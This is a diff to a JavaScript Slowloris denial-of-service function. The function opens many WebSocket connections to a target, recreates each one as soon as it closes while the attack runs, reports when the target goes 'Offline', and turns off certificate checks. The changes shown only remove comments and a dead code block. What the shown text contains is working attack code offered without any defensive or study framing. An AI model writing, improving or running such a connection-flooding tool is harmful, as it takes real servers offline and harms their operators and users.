@@ -53,7 +53,7 @@ function slowloris(target, numSockets, statsCallback) {
         return {
             stop: () => {
                 console.log("Slowloris attack setup failed. No sockets to close.");
-                clearInterval(statsInterval); // Stop stats interval even if setup fails
+                clearInterval(statsInterval);
             }
         };
     }
@@ -65,7 +65,7 @@ function slowloris(target, numSockets, statsCallback) {
             const protocol = isSecure ? 'wss://' : 'ws://';
             socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
                 origin: `${protocol}${hostname}`,
-                rejectUnauthorized: false // Consider removing in production
+                rejectUnauthorized: false
             });
 
             sockets.push(socket);
@@ -89,7 +89,7 @@ function slowloris(target, numSockets, statsCallback) {
                     targetStatus = "Offline";
                 }
                 if (attackActive) {
-                    setTimeout(() => createSocket(index), 100); // Recreate socket if attack is active
+                    setTimeout(() => createSocket(index), 100);
                 }
             });
 
@@ -100,16 +100,11 @@ function slowloris(target, numSockets, statsCallback) {
             });
 
             socket.on('message', (data) => {
-                //console.log(`Received message from socket ${index + 1}: ${data}`); // Log received data if needed for debugging
             });
 
 
         } catch (socketError) {
             console.error(`Error creating socket ${index + 1}:`, socketError.message);
-        } finally {
-             if (attackActive && sockets.length < numSockets) {
-                //setTimeout(() => createSocket(index), 100);  Moved socket recreation to close event
-            }
         }
     }
 
